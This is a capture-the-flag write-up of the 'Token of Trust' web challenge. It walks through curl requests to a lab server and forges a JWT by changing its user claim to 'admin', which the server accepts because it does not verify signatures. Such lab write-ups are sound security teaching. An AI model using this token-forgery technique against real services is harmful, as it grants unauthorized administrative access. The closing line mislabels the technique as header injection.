# Token of Trust

## Background

At first, this web app seems straightforward, but there’s something more lurking beneath the surface. It relies on a token for user authentication, but not everything is as secure as it seems. Look closely, and you might discover that the system’s trust can be manipulated.<br>

The secret is hidden within the way this token is used. Can you find the key to unlock what’s been concealed? The challenge is waiting for you to crack it.<br>

Submit your answer in the following format: ACECTF{3x4mpl3_fl4g}<br>

[http://34.131.133.224:9999/]()

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/ACECTF-1.0/images/image-14.jpg)

- **Difficulty: Easy**
- **This challenge doesn't have source code**

## Enumeration

Index page:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/ACECTF-1.0/images/image-15.jpg)

The index page tells us that if we want to log in, we have to visit `/login` endpoint:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/ACECTF-1.0/images/image-16.jpg)

The page says that we have to send a POST request with JSON payload like: `{"user":"ace","pass":"ctf"}` and it's doesn't care about our credentials. So I will use `curl` to test this endpoint:

```bash
┌──(vodanh㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user":"ace","pass":"ctf"}' http://34.131.133.224:9999/login
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.JT3l4_NkVbkQuZpl62b9h8NCZ3cTcypEGZ1lULWR47M"}
```
> Remember to set the Content-Type header to application/json if you want to send request with JSON data!

It will response to us with a **token**. This **token** has the `JWT` format, I will use [jwt.io](https://jwt.io/) to see the content of this `JWT`:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/ACECTF-1.0/images/image-17.jpg)

This `JWT`'s algorithm is `HS256` and with this `JWT`, we are currently a `guest` user. But the problem here is, what do we do with this **token**, because we don't know any endpoint to send this **token** to. If we try to send POST request to the endpoint `/login` with this **token**, it will return:

```bash
┌──(vodanh㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.JT3l4_NkVbkQuZpl62b9h8NCZ3cTcypEGZ1lULWR47M"}' http://34.131.133.224:9999/login
Invalid POST data. Did you forget the magic JSON format?
```

And if we POST the **token** with `user` and `pass`, it will return the token again:

```bash
┌──(vodanh㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user":"ace","pass":"ctf","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.JT3l4_NkVbkQuZpl62b9h8NCZ3cTcypEGZ1lULWR47M"}' http://34.131.133.224:9999/login
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.JT3l4_NkVbkQuZpl62b9h8NCZ3cTcypEGZ1lULWR47M"}
```

I have checked through the source page, but nothing special. So I decides to check if this page has the `robots.txt` file:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/ACECTF-1.0/images/image-18.jpg)

And yes! This page has the `robots.txt` file and it's telling us this page has the endpoint `/flag`. I will send POST request to this endpoint to see how it responses:

```bash
┌──(vodanh㉿kali)-[~]
└─$ curl -X POST http://34.131.133.224:9999/flag
No token? No flag! Bring me a token, and we'll talk. 👀 
```

So we need to POST to it a **token**. We don't know the format of the data to send to this endpoint, so we will try with the JSON data:

```bash
┌──(vodanh㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.JT3l4_NkVbkQuZpl62b9h8NCZ3cTcypEGZ1lULWR47M"}' http://34.131.133.224:9999/flag       
Sorry, you're not the admin. No flag for you! 😝
```

## Exploitation

It says that we are not the admin. So we need to change the value of the `user` key of the `JWT` from `guest` to `admin`. There's a problem that if we want to change any value of the `JWT`, we will need to know the secret key, otherwise we can't have a valid `JWT` because of the `signature` part. But we will try to change the value without the secret key, maybe the server won't check the **signature verfication**:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/ACECTF-1.0/images/image-19.jpg)

Send this new `JWT` to the `/flag` endpoint:

```bash
┌──(vodanh㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.lo6cc_YVMrNFnffGek_avzLJ_mgkuvBsSz52NO3_6Kk"}' http://34.131.133.224:9999/flag
ACECTF{jwt_cr4ck3d_4dm1n_4cce55_0bt41n3d!}
```

Luckily, we got the flag!

- **Flag: `ACECTF{jwt_cr4ck3d_4dm1n_4cce55_0bt41n3d!}`**

## Conclusion

What we've learned:

1. JWT authentication bypass via payload header injection